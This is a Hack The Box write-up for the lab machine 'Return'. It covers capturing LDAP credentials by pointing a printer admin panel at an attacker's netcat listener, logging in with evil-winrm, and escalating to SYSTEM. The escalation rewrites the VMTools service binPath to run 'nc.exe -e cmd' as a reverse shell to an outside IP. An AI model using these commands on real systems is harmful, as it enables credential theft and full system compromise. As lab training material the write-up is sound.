+++
title = "Return - Write up"
date = "2022-07-04T12:35:18-05:00"
author = "l0gan334"
cover = "Return.png"
tags = ["hacking", "ctf", "eJPT-like", "HTB", "windows"]
keywords = ["", ""]
description = "**HTB | Return - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++

**Return** is an easy Hack The Box machine managing a printing service.

We will abuse a printer web admin panel to get credentials we can use with evil-winrm. 

Once inside, our user is in the **Server Operators group** so we will be able to modify, start and stop **services**. This way we'll get a shell as a **nt authority\system**.


# **```Recon```**
# Nmap

With **nmap** we will find the opened ports and examinate them:
```bash 
❯ nmap -p- -sS --min-rate 5000 --open -n -Pn 10.129.78.30 -oG allPorts
```

We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:

{{< code language="bash" title="Here you have an useful function you can use for this manner" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep initiated | awk 'NF{print $NF}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
{{< /code >}}
```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.78.30
	[*] Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,49671,49676,49677,49680,49683,49699,53544

[*] Ports copied to clipboard
```

There are a lot of opened ports, thankfully **extractPorts** uses **xclip** to copy all the ports to the clipboard so we can continue with the recon in a more comfortable way:

```bash
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,49671,49676,49677,49680,49683,49699,53544 
10.129.78.30 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 17:57 -05
Nmap scan report for 10.129.78.30
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-04 23:16:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
53544/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-07-04T23:17:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.57 seconds
```

This amount of ports might be a little intimidating but let's start with the basics.
Port 80 is opened offering a **HTTP** server:

```bash
❯ whatweb http://10.129.78.30

http://10.129.78.30 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.78.30], Microsoft-IIS[10.0], PHP[7.4.13], 
Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
```

We don't get anything interesting from **whatweb** like vulnerable versions of IIS so we now visit the website:

{{< image src="/img/ret-1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It's a simple admin panel, inside **Settings** we find this:

{{< image src="/img/ret-2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It looks like it's conecting to a server with some credentials. 

Before trying anything too complex we can try to manipulate the **Server Address** where the authentication is being done with our **IP Address**:

{{< image src="/img/ret-3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

```bash
❯ nc -lvnp 389

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
Ncat: Connection from 10.129.78.30.
Ncat: Connection from 10.129.78.30:55399.
0*`%return\svc-printer
                      1edFg43012!!
```
# **```Intrusion```**

We manage to redirect the connection to our listener and we get the credentials!

With **crackmapexec** we can validate them:

```bash
❯ crackmapexec winrm 10.129.78.30 -u 'svc-printer' -p '1edFg43012!!'

SMB         10.129.78.30    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.129.78.30    5985   PRINTER          [*] http://10.129.78.30:5985/wsman
WINRM       10.129.78.30    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

The creds are valid and we also get **(Pwn3ed!)**, which means we can use **evil-winrm** to connect to **Windows Remote Management System**:

```bash
❯ evil-winrm -i 10.129.78.30 -u 'svc-printer' -p '1edFg43012!!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

We are in!

Inside the Desktop we can find the first flag:
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
8e07dd641f06c03b7***************
```
# **```Privilege escalation```**

Now we have to figure out our way to **root.txt** so we start the basic enumeration until we find something interesting:

- Checking for privileges:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

- Checking for group memberships:
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

We are part of **Server Operators** group, which means we have control over the services running inside the machine.

If we manage to edit a service and make it execute a **netcat** to our listener we will get a shell as **nt authority\system**.

So we are going to start by uploading the **nc.exe** to **C:\Windows\Temp**:
```bash
*Evil-WinRM* PS C:\Windows\Temp> upload /home/logan/Desktop/Tools/Windows/nc.exe
Info: Uploading /home/logan/Desktop/Tools/Windows/nc.exe to C:\Windows\Temp\nc.exe


Data: 37544 bytes of 37544 bytes copied

Info: Upload successful!
```

We can now start by listing the services:
```text
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> services

Path                                                                                                                 Privileges Service
----                                                                                                                 ---------- -------
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

With **sc.exe** we can try to create or modify a service:
```bash
*Evil-WinRM* PS C:\Windows\Temp> sc.exe config VMTools binPath="C:\Windows\Temp\nc.exe -e cmd 10.10.14.161 334"
[SC] ChangeServiceConfig SUCCESS
```

We managed to change the **path** to **VMTools**, so now once it's started it will execute the netcat.

Now we proceed to restart this service after we have set up our listener:
```bash
*Evil-WinRM* PS C:\Windows\Temp> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Windows\Temp> sc.exe start VMTools
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion
```

It looks like the service crashed but in the listener we get the connection:
```bash
❯ nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.78.30.
Ncat: Connection from 10.129.78.30:52344.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
 whoami
nt authority\system
```

As usual, inside Administrator's desktop we find **root.txt**: 
```bash
C:\Users\Administrator\Desktop>type root.txt
74ef5d962484b51bc5**************
```

See you next time!
